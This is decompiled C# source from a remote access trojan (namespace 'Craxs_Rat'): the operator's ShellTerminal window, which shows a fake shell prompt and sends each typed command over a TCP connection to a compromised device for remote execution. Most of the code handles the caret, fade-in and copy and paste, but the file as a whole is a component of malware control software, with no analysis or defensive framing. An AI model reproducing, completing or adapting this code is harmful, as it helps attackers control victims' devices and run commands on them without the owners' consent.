using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat
{
	// Token: 0x020000FB RID: 251
	[DesignerGenerated]
	public partial class ShellTerminal : Form
	{
		// Token: 0x06001244 RID: 4676 RVA: 0x000BE8CC File Offset: 0x000BCACC
		public ShellTerminal()
		{
			base.Load += this.ShellTerminal_Load;
			this.string_0 = "null";
			this.rectangle_0 = default(Rectangle);
			this.int_0 = -1;
			this.size_0 = new Size(6, 12);
			this.string_1 = "SHEEL:~$";
			this.bool_0 = false;
			this.bool_1 = true;
			this.InitializeComponent();
		}

		// Token: 0x17000560 RID: 1376
		// (get) Token: 0x06001247 RID: 4679 RVA: 0x00007434 File Offset: 0x00005634
		// (set) Token: 0x06001248 RID: 4680 RVA: 0x000BEC70 File Offset: 0x000BCE70
		internal virtual GRichTextBox0 OutText
		{
			[CompilerGenerated]
			get
			{
				return this._OutText;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.OutText_TextChanged);
				MouseEventHandler value3 = new MouseEventHandler(this.OutText_MouseClick);
				KeyEventHandler value4 = new KeyEventHandler(this.OutText_KeyDown);
				EventHandler value5 = new EventHandler(this.OutText_HScroll);
				EventHandler value6 = new EventHandler(this.OutText_VScroll);
				GRichTextBox0 outText = this._OutText;
				if (outText != null)
				{
					outText.TextChanged -= value2;
					outText.MouseClick -= value3;
					outText.KeyDown -= value4;
					outText.HScroll -= value5;
					outText.VScroll -= value6;
				}
				this._OutText = value;
				outText = this._OutText;
				if (outText != null)
				{
					outText.TextChanged += value2;
					outText.MouseClick += value3;
					outText.KeyDown += value4;
					outText.HScroll += value5;
					outText.VScroll += value6;
				}
			}
		}

		// Token: 0x17000565 RID: 1381
		// (get) Token: 0x06001249 RID: 4681 RVA: 0x0000743C File Offset: 0x0000563C
		// (set) Token: 0x0600124A RID: 4682 RVA: 0x000BED34 File Offset: 0x000BCF34
		internal virtual Timer Caret
		{
			[CompilerGenerated]
			get
			{
				return this._Caret;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.Caret_Tick);
				Timer caret = this._Caret;
				if (caret != null)
				{
					caret.Tick -= value2;
				}
				this._Caret = value;
				caret = this._Caret;
				if (caret != null)
				{
					caret.Tick += value2;
				}
			}
		}

		// Token: 0x17000566 RID: 1382
		// (get) Token: 0x0600124B RID: 4683 RVA: 0x00007444 File Offset: 0x00005644
		// (set) Token: 0x0600124C RID: 4684 RVA: 0x000BED78 File Offset: 0x000BCF78
		internal virtual Timer TOpacity
		{
			[CompilerGenerated]
			get
			{
				return this._TOpacity;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.TOpacity_Tick);
				Timer topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick -= value2;
				}
				this._TOpacity = value;
				topacity = this._TOpacity;
				if (topacity != null)
				{
					topacity.Tick += value2;
				}
			}
		}

		// Token: 0x17000561 RID: 1377
		// (get) Token: 0x0600124D RID: 4685 RVA: 0x0000744C File Offset: 0x0000564C
		// (set) Token: 0x0600124E RID: 4686 RVA: 0x000BEDBC File Offset: 0x000BCFBC
		internal virtual ProgressBar PB { get; set; }

		// Token: 0x17000562 RID: 1378
		// (get) Token: 0x0600124F RID: 4687 RVA: 0x00007454 File Offset: 0x00005654
		// (set) Token: 0x06001250 RID: 4688 RVA: 0x000BEDD0 File Offset: 0x000BCFD0
		internal virtual ContextMenuStrip ctxMenu { get; set; }

		// Token: 0x17000563 RID: 1379
		// (get) Token: 0x06001251 RID: 4689 RVA: 0x0000745C File Offset: 0x0000565C
		// (set) Token: 0x06001252 RID: 4690 RVA: 0x000BEDE4 File Offset: 0x000BCFE4
		internal virtual ToolStripMenuItem CopyToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._CopyToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.CopyToolStripMenuItem_Click);
				ToolStripMenuItem copyToolStripMenuItem = this._CopyToolStripMenuItem;
				if (copyToolStripMenuItem != null)
				{
					copyToolStripMenuItem.Click -= value2;
				}
				this._CopyToolStripMenuItem = value;
				copyToolStripMenuItem = this._CopyToolStripMenuItem;
				if (copyToolStripMenuItem != null)
				{
					copyToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000564 RID: 1380
		// (get) Token: 0x06001253 RID: 4691 RVA: 0x00007464 File Offset: 0x00005664
		// (set) Token: 0x06001254 RID: 4692 RVA: 0x000BEE28 File Offset: 0x000BD028
		internal virtual ToolStripMenuItem PasteToolStripMenuItem
		{
			[CompilerGenerated]
			get
			{
				return this._PasteToolStripMenuItem;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.PasteToolStripMenuItem_Click);
				ToolStripMenuItem pasteToolStripMenuItem = this._PasteToolStripMenuItem;
				if (pasteToolStripMenuItem != null)
				{
					pasteToolStripMenuItem.Click -= value2;
				}
				this._PasteToolStripMenuItem = value;
				pasteToolStripMenuItem = this._PasteToolStripMenuItem;
				if (pasteToolStripMenuItem != null)
				{
					pasteToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x06001255 RID: 4693 RVA: 0x000BEE6C File Offset: 0x000BD06C
		private void method_0()
		{
			try
			{
				foreach (RichTextBox richTextBox in base.Controls.OfType<RichTextBox>())
				{
					richTextBox.ForeColor = Module5.White;
					richTextBox.BackColor = Module5.color_0;
				}
			}
			finally
			{
				IEnumerator<RichTextBox> enumerator;
				if (enumerator != null)
				{
					enumerator.Dispose();
				}
			}
		}

		// Token: 0x06001256 RID: 4694 RVA: 0x000BEED4 File Offset: 0x000BD0D4
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity == 1.0)
			{
				this.TOpacity.Enabled = false;
			}
			else
			{
				base.Opacity += 0.1;
			}
		}

		// Token: 0x06001257 RID: 4695 RVA: 0x000BEF1C File Offset: 0x000BD11C
		private void ShellTerminal_Load(object sender, EventArgs e)
		{
			base.Icon = new Icon(Module8.string_1 + "\\Icons\\win\\15.ico");
			this.OutText.Font = Module8.font_1;
			Size size = TextRenderer.MeasureText("S", Module8.font_1);
			this.size_0 = new Size(checked((int)Math.Round((double)size.Width / 2.0)), size.Height);
			this.method_0();
			this.Text = this.string_0;
			this.ctxMenu.Renderer = new GClass12();
			this.OutText.ContextMenuStrip = this.ctxMenu;
			this.color_0 = this.OutText.ForeColor;
			this.OutText.TabStop = false;
			this.TOpacity.Interval = Module5.int_0;
			this.TOpacity.Enabled = true;
			this.OutText.Focus();
			this.OutText.Select();
		}

		// Token: 0x06001258 RID: 4696 RVA: 0x000BF010 File Offset: 0x000BD210
		private void method_3(int int_1)
		{
			string text = this.OutText.Text;
			if (text.Length > 0)
			{
				if (!(this.rectangle_0 == default(Rectangle)))
				{
					this.OutText.Invalidate(this.rectangle_0);
				}
				this.OutText.Update();
				Graphics graphics = this.OutText.CreateGraphics();
				Point positionFromCharIndex = this.OutText.GetPositionFromCharIndex(this.OutText.SelectionStart);
				this.rectangle_0 = new Rectangle(positionFromCharIndex.X, positionFromCharIndex.Y, this.size_0.Width, this.size_0.Height);
				int alpha = (int)this.color_0.A;
				if (this.OutText.SelectionStart != text.Length)
				{
					alpha = int_1;
				}
				graphics.FillRectangle(new Pen(Color.FromArgb(alpha, (int)this.color_0.R, (int)this.color_0.G, (int)this.color_0.B), (float)this.size_0.Width).Brush, this.rectangle_0);
				graphics.Dispose();
			}
		}

		// Token: 0x06001259 RID: 4697 RVA: 0x000BF13C File Offset: 0x000BD33C
		private void Caret_Tick(object sender, EventArgs e)
		{
			if (!this.bool_0)
			{
				if (this.int_0 != -1)
				{
					this.method_3(128);
					this.int_0 = -1;
				}
				else
				{
					if (!(this.rectangle_0 == default(Rectangle)))
					{
						this.OutText.Invalidate(this.rectangle_0);
					}
					this.int_0 = 1;
				}
			}
		}

		// Token: 0x0600125A RID: 4698 RVA: 0x000BF1A4 File Offset: 0x000BD3A4
		private void OutText_TextChanged(object sender, EventArgs e)
		{
			if (!this.bool_1 && this.OutText.Text.Length == 0)
			{
				this.method_8(false);
			}
			else if (!this.bool_0)
			{
				this.method_9();
			}
		}

		// Token: 0x0600125B RID: 4699 RVA: 0x000BF1EC File Offset: 0x000BD3EC
		private void OutText_MouseClick(object sender, MouseEventArgs e)
		{
			if (!this.bool_0)
			{
				this.method_9();
			}
		}

		// Token: 0x0600125C RID: 4700 RVA: 0x000BF20C File Offset: 0x000BD40C
		private void OutText_KeyDown(object sender, KeyEventArgs e)
		{
			if (e.KeyData == Keys.Up | e.KeyData == Keys.Down | e.KeyData == Keys.Right | e.KeyData == Keys.Left)
			{
				e.SuppressKeyPress = true;
			}
			else if (Control.ModifierKeys == Keys.Shift | Control.ModifierKeys == Keys.Control)
			{
				e.SuppressKeyPress = true;
			}
			else if (!this.OutText.ReadOnly && !this.bool_0)
			{
				if (e.KeyData == Keys.Return)
				{
					e.SuppressKeyPress = true;
					if (this.OutText.Lines.Length > 0)
					{
						string text = this.OutText.Lines[checked(this.OutText.Lines.Length - 1)];
						if (!text.Contains(this.string_1))
						{
							this.method_8(true);
							return;
						}
						text = text.Substring(this.string_1.Length);
						if (text.Length == 0)
						{
							return;
						}
						if (this.gclass8_0 != null)
						{
							object[] objects_ = new object[]
							{
								this.tcpClient_0,
								string.Concat(new string[]
								{
									Module13.string_28,
									GClass9.string_0,
									Module8.string_4,
									".terminal",
									GClass9.string_0,
									"method",
									GClass9.string_0,
									Module13.string_8,
									GClass9.string_0,
									"command",
									GClass9.string_1,
									text
								}),
								Module2.smethod_9().GetBytes("null"),
								this.gclass8_0
							};
							this.OutText.ReadOnly = true;
							this.bool_0 = true;
							if (!(this.rectangle_0 == default(Rectangle)))
							{
								this.OutText.Invalidate(this.rectangle_0);
							}
							this.gclass8_0.method_2(objects_);
						}
					}
				}
				this.method_9();
			}
		}

		// Token: 0x0600125D RID: 4701 RVA: 0x000BF410 File Offset: 0x000BD610
		public void method_8(bool bool_2)
		{
			this.OutText.DeselectAll();
			if (bool_2)
			{
				GRichTextBox0 outText = this.OutText;
				outText.AppendText("\r\n" + this.string_1);
			}
			else
			{
				GRichTextBox0 outText2 = this.OutText;
				outText2.AppendText(this.string_1);
			}
			this.OutText.SelectionStart = this.OutText.Text.Length;
		}

		// Token: 0x0600125E RID: 4702 RVA: 0x000BF47C File Offset: 0x000BD67C
		private void method_9()
		{
			if (!this.bool_0)
			{
				this.method_3(128);
				this.Caret.Enabled = false;
				this.Caret.Enabled = true;
			}
		}

		// Token: 0x0600125F RID: 4703 RVA: 0x000BF4B8 File Offset: 0x000BD6B8
		private void OutText_HScroll(object sender, EventArgs e)
		{
			this.OutText.Invalidate();
			this.method_3(255);
		}

		// Token: 0x06001260 RID: 4704 RVA: 0x000BF4B8 File Offset: 0x000BD6B8
		private void OutText_VScroll(object sender, EventArgs e)
		{
			this.OutText.Invalidate();
			this.method_3(255);
		}

		// Token: 0x06001261 RID: 4705 RVA: 0x000BF4DC File Offset: 0x000BD6DC
		private void PasteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (!this.OutText.ReadOnly)
			{
				this.OutText.Paste();
			}
		}

		// Token: 0x06001262 RID: 4706 RVA: 0x000BF504 File Offset: 0x000BD704
		private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.OutText.Copy();
		}

		// Token: 0x04000A34 RID: 2612
		public TcpClient tcpClient_0;

		// Token: 0x04000A35 RID: 2613
		public GClass8 gclass8_0;

		// Token: 0x04000A36 RID: 2614
		public string string_0;

		// Token: 0x04000A37 RID: 2615
		public Color color_0;

		// Token: 0x04000A38 RID: 2616
		private Rectangle rectangle_0;

		// Token: 0x04000A39 RID: 2617
		private int int_0;

		// Token: 0x04000A3A RID: 2618
		private Size size_0;

		// Token: 0x04000A3B RID: 2619
		private string string_1;

		// Token: 0x04000A3C RID: 2620
		public bool bool_0;

		// Token: 0x04000A3D RID: 2621
		public bool bool_1;
	}
}
